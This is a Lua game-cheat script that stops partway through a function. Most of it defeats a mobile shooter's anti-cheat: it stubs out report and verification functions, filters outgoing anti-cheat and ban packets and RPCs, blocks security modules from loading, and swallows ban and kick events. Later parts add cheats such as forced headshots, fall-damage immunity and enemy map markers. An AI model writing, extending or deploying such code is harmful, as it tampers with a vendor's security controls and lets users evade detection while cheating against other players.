
    -- ============================================================================
    -- NEW BYPASS
    -- ============================================================================

    pcall(function()
        local ok, mod = pcall(require, "client.slua.config.tlog.tlog_report_utils")
        if ok and mod then mod.ReportTLogEvent = empty_func end
    end)

    pcall(function()
        local ok, mod = pcall(require, "client.slua.logic.ugc.UGCNewTLogReport")
        if ok and mod then
            mod.SendExposeReq = empty_func
            mod.SendInteractionReq = empty_func
            mod.TLogReport = empty_func
        end
    end)

    pcall(function()
        local ok, mod = pcall(require, "GameLua.Mod.BaseMod.Client.ClientTLog.ClientTLogUtil")
        if ok and mod then
            mod.ReportGeneralCountByBRPhase = empty_func
            mod.ReportCommonTLogDataByBRPhase = empty_func
        end
    end)
end

local function InitializeScannerBlocker()
    pcall(function()
        local SubMgr = require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if SubMgr then
            local subs = {
                "AFKReportorSubsystem",
                "ClientDataStatistcsSubsystem",
                "AvatarExceptionSubsystem",
                "ShootVerifySubSystemClient",
                "MemoryCheckSubsystem",
                "SpeedCheckSubsystem",
                "WallCheckSubsystem",
                "FileCheckSubsystem",
                "BehaviorScoreSubsystem",
            }
            for _, name in ipairs(subs) do
                local sub = SubMgr:Get(name)
                if sub then
                    for k, v in pairs(sub) do
                        if type(v) == "function" and (k:find("Report") or k:find("Send") or k:find("Upload") or k:find("Verify") or k:find("Check") or k:find("Validate") or k:find("Scan") or k:find("Detect")) then pcall(function() sub[k] = nop end) end
                    end
                    if sub.ReportPingDelayTimer then
                        sub:RemoveGameTimer(sub.ReportPingDelayTimer)
                        sub.ReportPingDelayTimer = nil
                    end
                    sub.DelayCount = 0
                end
            end
        end
        local AvaEx = package.loaded["GameLua.Mod.Library.GamePlay.Avatar.Exception.AvatarExceptionPlayerInst"]
        if AvaEx then
            AvaEx.CheckAvatarException = nop
            AvaEx.CheckAvatarExceptionOnce = nop
            AvaEx.ReportAvatarException = nop
            AvaEx.CheckSlotMeshVisible = retFalse
            AvaEx.CheckPawnVisible = retFalse
            AvaEx.CheckCanBugglyPostException = retFalse
        end
        local TssSdk = package.loaded["TssSdk"] or _G.TssSdk
        if TssSdk then
            local origData = TssSdk.OnRecvData
            -- [FIX PING]: Thêm tham số 'true' vào hàm find để tìm kiếm chuỗi thuần túy, nhanh hơn hàng chục lần so với regex, chống giật ping
            TssSdk.OnRecvData = function(data)
                if type(data) == "string" and (data:find("report", 1, true) or data:find("exception", 1, true) or data:find("cheat", 1, true) or data:find("violation", 1, true) or data:find("hack", 1, true) or data:find("verify", 1, true)) then return end
                if origData then origData(data) end
            end
            TssSdk.SendReportInfo = nop
            TssSdk.ScanMemory = retTrue
            TssSdk.IsEmulator = retFalse
            TssSdk.GetTssSdkReportInfo = retEmptyString
            TssSdk.CheckEnvironment = retTrue
            TssSdk.VerifyProcess = retTrue
        end
    end)

    -- ============================================================================
    -- NEW BYPASS
    -- ============================================================================

    pcall(function()
        local ok, mod = pcall(require, "blacklist.slua.logic.lobby_gm.AvatarCheckerModule")
        if ok and mod then
            mod.CheckAvatar = true_func
            mod.ReportException = empty_func
        end
    end)

    pcall(function()
        local ok, mod = pcall(require, "client.slua.logic.memory_warning.logic_memory_warning")
        if ok and mod then
            mod.OnMemoryWarning = empty_func
            mod.ReportMemoryWarning = empty_func
        end
    end)
end

local function InitializeReplayTelemetryBlocker()
    pcall(function()
        local SubMgr = require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if SubMgr then
            for _, name in ipairs({ "GameReportSubsystem", "ReplaySubsystem" }) do
                local sub = SubMgr:Get(name)
                if sub then
                    for k, v in pairs(sub) do
                        if type(v) == "function" and (k:find("Report") or k:find("Trace") or k:find("Replay") or k:find("Record") or k:find("Save")) then pcall(function() sub[k] = nop end) end
                    end
                end
            end
        end
        local logRep = package.loaded["client.slua.logic.replay.logic_report_replay"]
        if logRep then
            logRep.ReportReplay = nop
            logRep.SendReportReq = nop
            logRep.UploadReplay = nop
        end
    end)
end

local function InitializeReportFlowBlocker()
    pcall(function()
        local flows = {
            "ReportAimFlow",
            "ReportHitFlow",
            "ReportAttackFlow",
            "ReportSecAttackFlow",
            "ReportFireArms",
            "ReportVerifyInfoFlow",
            "ReportMrpcsFlow",
            "ReportPlayerBehavior",
            "ReportTeammatHurt",
            "ReportMisKillByTeammate",
            "ReportForbitPick",
            "ReportPlayerMoveRoute",
            "ReportPlayerPosition",
            "ReportVehicleMoveFlow",
            "ReportSecTgameMovingFlow",
            "ReportParachuteData",
            "ReportEquipmentFlow",
            "ReportPlayersPing",
            "ReportPlayerIP",
            "ReportPlayerFramePingRecord",
            "ReportDSNetSaturation",
            "ReportNetContinuousSaturate",
            "ReportDSNetRate",
            "ReportCircleFlow",
            "ReportSecMrpcsFlow",
        }
        for _, f in ipairs(flows) do
            if _G[f] then _G[f] = nop end
            if _G.GameplayCallbacks and _G.GameplayCallbacks[f] then _G.GameplayCallbacks[f] = nop end
        end
        for _, f in ipairs({ "CheckReportSecAttackFlowWithAttackFlow", "CheckReportSecAttackFlow" }) do
            if _G[f] then _G[f] = retFalse end
            if _G.GameplayCallbacks and _G.GameplayCallbacks[f] then _G.GameplayCallbacks[f] = retFalse end
        end
        for _, f in ipairs({ "IsEnableReportMrpcsInCircleFlow", "IsEnableReportMrpcsInPartCircleFlow", "IsEnableReportMrpcsFlow", "IsEnableReportAttackFlow", "IsEnableReportHitFlow", "IsEnableReportCircleFlow" }) do
            if _G[f] then _G[f] = retFalse end
        end
    end)
end

local function InitializePlayerSecurityBypass()
    pcall(function()
        for _, c in ipairs({ "PlayerSecurityInfoCollector", "PlayerSecurityInfo", "SecurityInfoCollector", "ClientSecurityCollector", "PlayerAntiCheatCollector" }) do
            if _G[c] then
                for k, v in pairs(_G[c]) do
                    if type(v) == "function" and (k:find("Report") or k:find("Collect") or k:find("Send") or k:find("Upload") or k:find("Record")) then _G[c][k] = nop end
                end
            end
        end
        local SecSub = require("GameLua.Mod.BaseMod.Common.Security.PlayerSecurityInfoSubsystem")
        if SecSub then
            SecSub.ReportData = nop
            SecSub.CheckCheat = retFalse
            SecSub.ValidatePlayer = retTrue
            SecSub.CollectData = nop
            SecSub.SendToServer = nop
        end
    end)
end

local function InitializeClientFlowBypass()
    pcall(function()
        for _, name in ipairs({ "ClientSecMrpcsFlow", "MrpcsFlow", "MrpcsData", "ClientCircleFlowSubsystem", "ClientKillFlowSubsystem", "ClientSecPlayerKillFlow" }) do
            local sub = package.loaded[name] or _G[name]
            if sub then
                for k, v in pairs(sub) do
                    if type(v) == "function" and (k:find("Report") or k:find("Send") or k:find("Flow") or k:find("Record") or k:find("Process")) then pcall(function() sub[k] = nop end) end
                end
            end
        end
    end)
end

local function InitializeSwiftHawkBypass()
    pcall(function()
        for _, f in ipairs({ "SwiftHawk", "ClientSwiftHawk", "ClientSwiftHawkWithParams", "SendSwiftHawkData" }) do
            if _G[f] then _G[f] = nop end
            if _G.GameplayCallbacks and _G.GameplayCallbacks[f] then _G.GameplayCallbacks[f] = nop end
        end
        local sub = package.loaded["GameLua.Mod.BaseMod.Client.Security.SwiftHawkSubsystem"]
        if sub then
            sub.ReportData = nop
            sub.SendReport = nop
            sub.CollectTelemetry = nop
        end
    end)
end

local function InitializeCoronaLabBypass()
    pcall(function()
        if _G.CoronaLab then
            _G.CoronaLab.ReportData = nop
            _G.CoronaLab.SendData = nop
            _G.CoronaLab.CollectData = nop
            _G.CoronaLab.Telemetry = nop
        end
        local sub = require("GameLua.GameCore.Module.Subsystem.SubsystemMgr"):Get("CoronaLabSubsystem")
        if sub then
            sub.ReportData = nop
            sub.SendToServer = nop
            sub.CollectTelemetry = nop
            sub.StopCollection = nop
        end
    end)
end

local function InitializeModifierExceptionBypass()
    pcall(function()
        if _G.bReportedModifierException then _G.bReportedModifierException = false end
        local sub = require("GameLua.Mod.BaseMod.Common.Security.ModifierExceptionSubsystem")
        if sub then
            sub.ReportException = nop
            sub.CheckModifier = retTrue
            sub.ValidateModifier = retTrue
            sub.ReportModifierError = nop
        end
    end)
end

local function InitializeSimulateCharacterLocationBypass()
    pcall(function()
        local sub = require("GameLua.Mod.BaseMod.Gameplay.Simulate.SimulateCharacterSubsystem")
        if sub then
            sub.ReportLocation = nop
            sub.SendLocationData = nop
            sub.VerifyLocation = retTrue
        end
    end)
end

local function InitializeShootVerificationBypass()
    pcall(function()
        local sub = require("GameLua.Dev.Subsystem.ShootVerifySubSystemClient")
        if sub then
            sub.OnShootVerifyFailed = nop
            sub.SendVerifyData = nop
            sub.ReportBulletHit = nop
            sub.UploadHitInfo = nop
            sub.VerifyShot = retTrue
        end
        if _G.BulletHitInfoUploadData then
            _G.BulletHitInfoUploadData.Report = nop
            _G.BulletHitInfoUploadData.Send = nop
            _G.BulletHitInfoUploadData.Upload = nop
        end
    end)
end

local function InitializeNetworkPacketBlock()
    pcall(function()
        if NetUtil and NetUtil.SendPacket then
            local orig = NetUtil.SendPacket
            local blocked = {
                ["ReportAttackFlow"] = 1,
                ["ReportSecAttackFlow"] = 1,
                ["ReportFireArms"] = 1,
                ["ReportVerifyInfoFlow"] = 1,
                ["ReportMrpcsFlow"] = 1,
                ["ReportPlayerBehavior"] = 1,
                ["ReportTeammatHurt"] = 1,
                ["ReportPlayerMoveRoute"] = 1,
                ["ReportPlayerPosition"] = 1,
                ["ReportSecVehicleMoveFlow"] = 1,
                ["report_parachute_data"] = 1,
                ["on_tss_sdk_anti_data"] = 1,
                ["ReportAimFlow"] = 1,
                ["ReportHitFlow"] = 1,
                ["ReportCircleFlow"] = 1,
                ["report_players_ping"] = 1,
                ["report_player_ip"] = 1,
                ["report_net_saturate"] = 1,
                ["report_speed_hack"] = 1,
                ["report_wall_hack"] = 1,
                ["report_aim_bot"] = 1,
                ["report_esp_usage"] = 1,
                ["report_modded_files"] = 1,
                ["detect_cheat"] = 1,
                ["ban_player"] = 1,
                ["client_anti_cheat_report"] = 1,
                ["ClientSecMrpcsFlow"] = 1,
                ["MrpcsData"] = 1,
                ["CheckReportSecAttackFlow"] = 1,
                ["CheckReportSecAttackFlowWithAttackFlow"] = 1,
                ["RPC_ClientCoronaLab"] = 1,
                ["CoronaLabReport"] = 1,
                ["CoronaLabData"] = 1,
                ["PlayerSecurityInfo"] = 1,
                ["ReportSecurityInfo"] = 1,
                ["SendSecurityData"] = 1,
                ["ClientCircleFlow"] = 1,
                ["IsEnableReportMrpcsInCircleFlow"] = 1,
                ["IsEnableReportMrpcsInPartCircleFlow"] = 1,
                ["bReportedModifierException"] = 1,
                ["ReportModifierException"] = 1,
                ["RPC_Server_ReportSimulateCharacterLocation"] = 1,
                ["ReportSimulateCharacterLocation"] = 1,
                ["RPC_Client_ShootVertifyRes"] = 1,
                ["BulletHitInfoUploadData"] = 1,
                ["ShootVerifyFailed"] = 1,
                ["report_unrealnet_exception"] = 1,
                ["tss_sdk_report"] = 1,
                ["SwiftHawk"] = 1,
                ["ClientSwiftHawk"] = 1,
                ["ClientSwiftHawkWithParams"] = 1,
                ["SwiftHawkReport"] = 1,
                ["SwiftHawkData"] = 1,
                ["AntiCheatReport"] = 1,
                ["CheatDetection"] = 1,
                ["ViolationReport"] = 1,
                ["SecurityViolation"] = 1,
                ["IntegrityCheck"] = 1,
                ["SignatureVerify"] = 1,
                ["ReportHurtFlow"] = 1,
                ["SendTssSdkAntiDataToLobby"] = 1,
                ["report_avatar_exception"] = 1,
                ["report_memory_exception"] = 1,
                ["report_client_scan_result"] = 1,
            }
            NetUtil.SendPacket = function(packetName, ...)
                if blocked[packetName] then return nil end
                return orig(packetName, ...)
            end
            NetUtil.IsBypassed = true
        end
        if _G.SendRPC then
            local origRPC = _G.SendRPC
            local blockedRPC = {
                "RPC_Server_ClientSecMrpcsFlow",
                "RPC_Server_SwiftHawk",
                "RPC_Server_ClientSwiftHawkWithParams",
                "RPC_Server_ReportSimulateCharacterLocation",
                "RPC_Client_ShootVertifyRes",
                "RPC_ClientCoronaLab",
            }
            _G.SendRPC = function(rpcName, ...)
                for _, b in ipairs(blockedRPC) do
                    if rpcName == b then return nil end
                end
                return origRPC(rpcName, ...)
            end
        end
    end)
end

local function InitializeHiggsBosonBypass()
    pcall(function()
        local Higgs = require("GameLua.Mod.BaseMod.Common.Security.HiggsBosonComponent")
        if Higgs then
            for _, m in ipairs({
                "ControlMHActive",
                "Tick",
                "OnTick",
                "MHActiveLogic",
                "TriggerAvatarCheck",
                "StartAvatarCheck",
                "ReportItemID",
                "ReceiveAnyDamage",
                "OnWeaponHitRecord",
                "ShowSecurityAlert",
                "ServerReportAvatar",
                "ClientReportNetAvatar",
                "SendHisarData",
                "ValidateSecurityData",
                "StaticShowSecurityAlertInDev",
                "RPC_Client_ShootVertifyRes",
                "RPC_Server_ReportSimulateCharacterLocation",
                "DisableHiggsBoson",
                "CheckMHActive",
                "ReportViolation",
                "ProcessSecurityEvent",
                "ValidatePlayer",
                "CheckIntegrity",
            }) do
                if Higgs[m] then Higgs[m] = nop end
            end
            Higgs.GetNetAvatarItemIDs = retEmpty
            Higgs.GetCurWeaponSkinID = retZero
            Higgs.IsMHActive = retFalse
            Higgs.bMHActive = false
            Higgs.bCallPreReplication = false
            if Higgs.BlackList then
                for k in pairs(Higgs.BlackList) do
                    Higgs.BlackList[k] = nil
                end
            end
        end
        _G.BlackList = {}
        local pc = slua_GameFrontendHUD and slua_GameFrontendHUD:GetPlayerController()
        if slua.isValid(pc) then
            if pc.HiggsBoson then
                pc.HiggsBoson.bMHActive = false
                pc.HiggsBoson.bCallPreReplication = false
                if pc.HiggsBoson.ControlMHActive then pc.HiggsBoson:ControlMHActive(0) end
            end
            if pc.HiggsBosonComponent then
                pc.HiggsBosonComponent.bMHActive = false
                pc.HiggsBosonComponent.bCallPreReplication = false
                pc.HiggsBosonComponent:ControlMHActive(0)
            end
        end
    end)
end

local function InitializeAntiCheatHooks()
    pcall(function()
        local HBC = require("GameLua.Mod.BaseMod.Common.Security.HiggsBosonComponent")
        if HBC and HBC.StaticShowSecurityAlertInDev then HBC.StaticShowSecurityAlertInDev = nop end
    end)
    if _G.AvatarCheckCallback then
        _G.AvatarCheckCallback.StartAvatarCheck = nop
        _G.AvatarCheckCallback.OnReportItemID = nop
        _G.AvatarCheckCallback.PostPlayerControllerLoginInit = function(PlayerController)
            if slua.isValid(PlayerController) and PlayerController.HiggsBosonComponent then
                PlayerController.HiggsBosonComponent:ControlMHActive(0)
                PlayerController.HiggsBosonComponent.bMHActive = false
            end
        end
    end
end

local function InitializeAntiReport()
    pcall(function()
        for _, path in ipairs({
            "GameLua.Mod.BaseMod.Client.Security.ClientReportPlayerSubsystem",
            "Client.Security.ClientReportPlayerSubsystem",
            "GameLua.Mod.BaseMod.DS.Security.DSReportPlayerSubsystem",
        }) do
            local sub = package.loaded[path]
            if not sub then
                local s, r = pcall(require, path)
                if s and r then sub = r end
            end
            if sub then
                for k, v in pairs(sub) do
                    if type(v) == "function" and (k:find("Report") or k:find("Record") or k:find("Send") or k:find("Upload") or k:find("Notify")) then pcall(function() sub[k] = nop end) end
                end
            end
        end
    end)

    -- ============================================================================
    -- NEW BYPASS
    -- ============================================================================

    pcall(function()
        local ok, mod = pcall(require, "GameLua.Mod.BaseMod.Common.Security.ReportPlayerUtils")
        if ok and mod then
            mod.RecordFatalDamager = empty_func
            mod.IsUsingHistoricalTeammateInfo = false_func
            mod.IsCharacterDeliverAI = false_func
        end
    end)

    pcall(function()
        local ok, mod = pcall(require, "GameLua.Mod.BaseMod.Client.Security.ClientQuickReportMaliciousTeammate")
        if ok and mod then
            mod.OnShowMutualExclusiveUI = empty_func
            mod.OnHideMutualExclusiveUI = empty_func
        end
    end)
end

local function InitializeGameplayBypass()
    pcall(function()
        if not _G.GameplayCallbacks then _G.GameplayCallbacks = {} end
        if _G.GameplayCallbacks.IsBypassed then return end
        local GC = _G.GameplayCallbacks
        local reports = {
            "ReportAttackFlow",
            "ReportSecAttackFlow",
            "ReportFireArms",
            "ReportVerifyInfoFlow",
            "ReportMrpcsFlow",
            "ReportPlayerBehavior",
            "ReportTeammatHurt",
            "ReportMisKillByTeammate",
            "ReportForbitPick",
            "ReportPlayerMoveRoute",
            "ReportPlayerPosition",
            "ReportVehicleMoveFlow",
            "ReportSecTgameMovingFlow",
            "ReportParachuteData",
            "SendTssSdkAntiDataToLobby",
            "ReportEquipmentFlow",
            "ReportAimFlow",
            "ReportPlayersPing",
            "ReportPlayerIP",
            "ReportPlayerFramePingRecord",
            "OnDSConnectionSaturated",
            "ReportDSNetSaturation",
            "ReportNetContinuousSaturate",
            "ReportDSNetRate",
            "SendClientStats",
            "SendServerAvgTickDelta",
            "ReportCircleFlow",
            "ClientSecMrpcsFlow",
            "SwiftHawk",
            "ClientSwiftHawk",
            "ClientSwiftHawkWithParams",
        }
        for _, f in ipairs(reports) do
            GC[f] = nop
        end
        GC.CheckReportSecAttackFlowWithAttackFlow = retFalse
        GC.CheckReportSecAttackFlow = retFalse
        local origState = GC.OnDSPlayerStateChanged
        GC.OnDSPlayerStateChanged = function(UID, State, bPure, bSafe, Param)
            local s = State and string.lower(tostring(State)) or ""
            local blocked = {
                ["cheatdetected"] = 1,
                ["connectionlost"] = 1,
                ["connectiontimeout"] = 1,
                ["connectionexception"] = 1,
                ["netdrivererror"] = 1,
                ["banned"] = 1,
                ["kicked"] = 1,
                ["suspended"] = 1,
                ["violationdetected"] = 1,
                ["integrityfailure"] = 1,
                ["securityviolation"] = 1,
                ["ban"] = 1,
                ["kick"] = 1,
            }
            if blocked[s] then return end
            if origState then pcall(origState, UID, State, bPure, bSafe, Param) end
        end
        GC.OnPlayerNetConnectionClosed = nop
        GC.OnPlayerActorChannelError = nop
        GC.OnPlayerRPCValidateFailed = nop
        GC.OnPlayerSpectateException = nop
        GC.OnShutdownAfterError = nop
        GC.IsBypassed = true
    end)
end

local function InitializeKillAllSubsystems()
    pcall(function()
        local subMgr = require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if not subMgr then return end
        local toKill = {
            "CoronaLabSubsystem",
            "PlayerSecurityInfoSubsystem",
            "ClientCircleFlowSubsystem",
            "ModifierExceptionSubsystem",
            "SimulateCharacterSubsystem",
            "ShootVerifySubSystemClient",
            "HiggsBosonComponent",
            "ClientReportPlayerSubsystem",
            "DSReportPlayerSubsystem",
            "ClientHawkEyePatrolSubsystem",
            "DSHawkEyePatrolSubsystem",
            "ClientDataStatistcsSubsystem",
            "AFKReportorSubsystem",
            "BehaviorScoreSubsystem",
            "FileCheckSubsystem",
            "MemoryCheckSubsystem",
            "SpeedCheckSubsystem",
            "WallCheckSubsystem",
            "AvatarExceptionSubsystem",
            "GameReportSubsystem",
            "ClientSecMrpcsFlowSubsystem",
            "MrpcsFlowSubsystem",
            "CircleFlowSubsystem",
            "SwiftHawkSubsystem",
            "AntiCheatSubsystem",
            "IntegrityCheckSubsystem",
            "SignatureVerifySubsystem",
            "MD5CheckSubsystem",
            "PakVerifySubsystem",
        }
        for _, name in ipairs(toKill) do
            local sub = subMgr:Get(name)
            if sub then
                for k, v in pairs(sub) do
                    if type(v) == "function" and (k:find("Report") or k:find("Send") or k:find("Upload") or k:find("Verify") or k:find("Check") or k:find("Validate") or k:find("Scan") or k:find("Detect") or k:find("Collect") or k:find("Flow") or k:find("Heartbeat")) then
                        pcall(function() sub[k] = nop end)
                    end
                end
                if sub.timer then pcall(function() sub:RemoveGameTimer(sub.timer) end) end
                if sub.heartbeatTimer then pcall(function() sub:RemoveGameTimer(sub.heartbeatTimer) end) end
                if sub.reportTimer then pcall(function() sub:RemoveGameTimer(sub.reportTimer) end) end
            end
        end
    end)
end

local function InitializeFinalProtection()
    pcall(function()
        for _, flag in ipairs({
            "ENABLE_REPORT",
            "ENABLE_ANTI_CHEAT",
            "ENABLE_SECURITY",
            "ENABLE_TELEMETRY",
            "ENABLE_ANALYTICS",
            "ENABLE_CRASH_REPORT",
            "ENABLE_PERFORMANCE_REPORT",
        }) do
            if _G[flag] then _G[flag] = false end
        end
        local origReq = require
        local blocked = {
            "HiggsBosonComponent",
            "PlayerSecurityInfoSubsystem",
            "CoronaLabSubsystem",
            "ClientCircleFlowSubsystem",
            "ModifierExceptionSubsystem",
            "ShootVerifySubSystemClient",
            "ClientReportPlayerSubsystem",
            "DSReportPlayerSubsystem",
        }
        _G.require = function(m)
            for _, b in ipairs(blocked) do
                if m:find(b) then return {} end
            end
            return origReq(m)
        end
    end)
end

local function InitializeOperationalStatsBypass()
    pcall(function()
        -- Gunakan SubsystemMgr atau Global untuk memastikan 100% mencapai tujuan
        local subMgr = require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        local OperationalStatsSubsystem = (subMgr and subMgr:Get("OperationalStatsSubsystem")) or _G.OperationalStatsSubsystem

        if OperationalStatsSubsystem then
            OperationalStatsSubsystem.ReportOperationalStats = nop
            OperationalStatsSubsystem.AddOperationalStats = nop
            OperationalStatsSubsystem.HandleTouchBegin = nop
            OperationalStatsSubsystem.HandleTouchEnd = nop
            OperationalStatsSubsystem.OnInit = nop
            OperationalStatsSubsystem.HandleEnterFighting = nop
            OperationalStatsSubsystem.OnBattleResult = nop
            if OperationalStatsSubsystem.TimerHandle then
                pcall(function() OperationalStatsSubsystem:RemoveGameTimer(OperationalStatsSubsystem.TimerHandle) end)
                OperationalStatsSubsystem.TimerHandle = nil
            end
            OperationalStatsSubsystem.StatsData = {}
            print("[ULTIMATE BYPASS] OperationalStatsSubsystem blocked!")
        end
    end)
end

_G.StartBypass_VIP_v3 = function()
    pcall(function()
        print("[ULTIMATE BYPASS] Starting initialization...")
        InitializeSLUABypass()
        InitializeMD5Bypass()
        InitializeSkinBypass() -- Tambahkan baris ini
        InitializeLogBlocker()
        InitializeScannerBlocker()
        InitializeReplayTelemetryBlocker()
        InitializeReportFlowBlocker()
        InitializePlayerSecurityBypass()
        InitializeClientFlowBypass()
        InitializeSwiftHawkBypass()
        InitializeCoronaLabBypass()
        InitializeModifierExceptionBypass()
        InitializeSimulateCharacterLocationBypass()
        InitializeShootVerificationBypass()
        InitializeNetworkPacketBlock()
        InitializeHiggsBosonBypass()
        InitializeAntiCheatHooks()
        InitializeAntiReport()
        InitializeGameplayBypass()
        InitializeKillAllSubsystems()
        InitializeOperationalStatsBypass() -- [BARU] MENGHINDARI LAPORAN STATISTIK (Statistik Operasional)
        InitializeFinalProtection()
        print("[ULTIMATE BYPASS] Complete - All Security Systems Disabled")
    end)
end

-- ========================================== 
-- HÀM QUẢN LÝ DỌN RÁC MAP MARK (CHỐNG LAG/HIỂN THỊ ẢO KHI ĐỊCH CHẾT)
-- ========================================== 
local function SafeAddMark(id, pos, z, str, size, actor)
    local mark = nil
    pcall(function()
        local InGameMarkTools = require("GameLua.Mod.BaseMod.Common.InGameMarkTools")
        if InGameMarkTools and InGameMarkTools.ClientAddMapMark then
            mark = InGameMarkTools.ClientAddMapMark(id, pos, z, str, size, actor)
            if mark then _G.LexusState.TrackedMarks[mark] = true end
        end
    end)
    return mark
end

local function SafeRemoveMark(mark)
    if not mark then return end
    pcall(function()
        local InGameMarkTools = require("GameLua.Mod.BaseMod.Common.InGameMarkTools")
        if InGameMarkTools and InGameMarkTools.HideMapMark then
            InGameMarkTools.HideMapMark(mark)
        end
        if InGameMarkTools and InGameMarkTools.RemoveMapMark then
            InGameMarkTools.RemoveMapMark(mark)
        end
    end)
    _G.LexusState.TrackedMarks[mark] = nil
end

-- ========================================== 
-- TẠO ID DUY NHẤT VÀ VĨNH VIỄN CHO MỖI KẺ ĐỊCH
-- ==========================================
local function GetSafeEnemyKey(enemy)
    if Valid(enemy) then
        if enemy.PlayerKey then return tostring(enemy.PlayerKey) end
        if type(enemy.GetUniqueID) == "function" then return tostring(enemy:GetUniqueID()) end
    end
    return tostring(enemy)
end

-- ========================================== 
-- KIỂM TRA PHÂN BIỆT AI (BOT) / REAL PLAYER - OPTIMIZED
-- ==========================================
local function CheckIsAI(pawn, markData)
    if markData.AK_IS_BOT ~= nil then return markData.AK_IS_BOT, true end
    
    local isAI = false
    local hasChecked = false
    pcall(function()
        if pawn.bIsAI == true or pawn.IsAI == true then isAI = true; hasChecked = true end
        if type(pawn.IsBot) == "function" and pawn:IsBot() then isAI = true; hasChecked = true end
        
        local pState = pawn.PlayerState or (type(pawn.GetPlayerState) == "function" and pawn:GetPlayerState())
        if Valid(pState) then
            hasChecked = true
            if pState.bIsABot == true or pState.bIsBot == true then isAI = true end
            if type(pState.IsBot) == "function" and pState:IsBot() then isAI = true end
        end
        
        if not isAI then
            local name = pawn.PlayerName or (type(pawn.GetPlayerName) == "function" and pawn:GetPlayerName()) or ""
            if name ~= "" and (name:find("Cobra") or name:find("Target") or name:find("bot_") or name:find("b_")) then
                isAI = true
                hasChecked = true
            end
        end
    end)
    if hasChecked then markData.AK_IS_BOT = isAI end
    return isAI, hasChecked
end

-- ========================================== 
-- KHỞI TẠO HOOKS AUTO HEAD SÁT THƯƠNG
-- ==========================================
function _G.InitializeAutoHeadHooks()
    pcall(function()
        local EAvatarDamagePosition = import("EAvatarDamagePosition")
        if not EAvatarDamagePosition then return end

        local modulesToHook = {
            "GameLua.Mod.BaseMod.Common.Weapon.ShootWeaponEntity",
            "GameLua.Logic.Weapon.ShootWeaponEntity"
        }
        
        for _, path in ipairs(modulesToHook) do
            local hitLogic = package.loaded[path]
            if hitLogic then
                local original_GetHitBodyType = hitLogic.GetHitBodyType
                hitLogic.GetHitBodyType = function(self, ImpactResult, InImpactVec)
                    if _G.LexusConfig.AutoHead then return EAvatarDamagePosition.BigHead end
                    if original_GetHitBodyType then return original_GetHitBodyType(self, ImpactResult, InImpactVec) end
                end

                local original_GetHitBodyTypeByHitPos = hitLogic.GetHitBodyTypeByHitPos
                hitLogic.GetHitBodyTypeByHitPos = function(self, InImpactVec)
                    if _G.LexusConfig.AutoHead then return EAvatarDamagePosition.BigHead end
                    if original_GetHitBodyTypeByHitPos then return original_GetHitBodyTypeByHitPos(self, InImpactVec) end
                end
            end
        end
    end)
end

-- ========================================== 
-- LOST TOMB FEATURES INTEGRATION
-- ==========================================

-- ========================================== 
-- LOST TOMB: Ignore Falling Damage
-- ==========================================
_G.LostTomb_IgnoreFallingDamageMarkMap = {}

function _G.LostTomb_MarkIgnoreFallingDamage(Reason, bRemove, Duration)
    if not _G.LexusConfig.IgnoreFallingDamage then return end
    
    local localPlayer = GameplayData.GetPlayerCharacter()
    if not Valid(localPlayer) then return end
    
    if bRemove then
        _G.LostTomb_IgnoreFallingDamageMarkMap[Reason] = nil
    else
        local CurTime = os.time()
        _G.LostTomb_IgnoreFallingDamageMarkMap[Reason] = CurTime + Duration
    end
    
    -- Clean expired entries
    local CurTime = os.time()
    for k, v in pairs(_G.LostTomb_IgnoreFallingDamageMarkMap) do
        if CurTime > v then
            _G.LostTomb_IgnoreFallingDamageMarkMap[k] = nil
        end
    end
    
    -- Apply to character
    pcall(function()
        local fallDamageCheck = localPlayer.CheckIgnoreFallingDamage
        if type(fallDamageCheck) == "function" then
            local bIgnore = false
            for _, v in pairs(_G.LostTomb_IgnoreFallingDamageMarkMap) do
                if v >= CurTime then bIgnore = true break end
            end
            -- Set attribute to ignore fall damage
            if bIgnore then
                localPlayer:SetAttrValue("LandDamageReduce", 1, -1)
            else
                localPlayer:SetAttrValue("LandDamageReduce", 0, -1)
            end
        end
    end)
end

-- ========================================== 
-- LOST TOMB: AIIgnoreEnemyTarget
-- ==========================================
function _G.LostTomb_AddAIIgnoreEnemyTargetRef()
    if not _G.LexusConfig.DisableAIIgnoreEnemyTarget then return end
    
    local localPlayer = GameplayData.GetPlayerCharacter()
    if not Valid(localPlayer) then return end
    
    if localPlayer:HasAuthority() then
        if localPlayer.AddAIIgnoreEnemyTargetRef then
            localPlayer:AddAIIgnoreEnemyTargetRef()
        end
    end
end

function _G.LostTomb_RemoveAIIgnoreEnemyTargetRef()
    if not _G.LexusConfig.DisableAIIgnoreEnemyTarget then return end
    
    local localPlayer = GameplayData.GetPlayerCharacter()
    if not Valid(localPlayer) then return end
    
    if localPlayer:HasAuthority() then
        if localPlayer.RemoveAIIgnoreEnemyTargetRef then
            localPlayer:RemoveAIIgnoreEnemyTargetRef()
        end
    end
end

-- ========================================== 
-- LOST TOMB: Steal Life Effect
-- ==========================================
function _G.LostTomb_UpdateStealLifeCount(count)
    if not _G.LexusConfig.EnableStealLifeEffect then return end
    
    _G.LexusState.StealLifeCount = (_G.LexusState.StealLifeCount or 0) + count
    
    local localPlayer = GameplayData.GetPlayerCharacter()
    if Valid(localPlayer) then
        if localPlayer.StealLifeCount ~= nil then
            localPlayer.StealLifeCount = _G.LexusState.StealLifeCount
            if type(localPlayer.OnRep_StealLifeCount) == "function" then
                localPlayer:OnRep_StealLifeCount()
            end
        end
    end
end

-- ========================================== 
-- LOST TOMB: Custom Gender
-- ==========================================
function _G.LostTomb_GetCustomGender()
    if not _G.LexusConfig.EnableCustomGender then return end
    
    local localPlayer = GameplayData.GetPlayerCharacter()
    if not Valid(localPlayer) then return end
    
    if type(localPlayer.GetCustomGender) == "function" then
        return localPlayer:GetCustomGender()
    end
    return 0
end

-- ========================================== 
-- LOST TOMB: Loading Avatar
-- ==========================================
function _G.LostTomb_SetCloseCharacterOverrideAvatar(bClose)
    if not _G.LexusConfig.EnableLoadingAvatar then return end
    
    local localPlayer = GameplayData.GetPlayerCharacter()
    if not Valid(localPlayer) then return end
    
    if type(localPlayer.SetCloseCharacterOverrideAvatar) == "function" then
        localPlayer:SetCloseCharacterOverrideAvatar(bClose)
        _G.LexusState.IsCloseCharacterOverrideAvatar = bClose
    end
end

-- ========================================== 
-- LOST TOMB: Head HP Bar
-- ==========================================
function _G.LostTomb_ShowHeadHPBar()
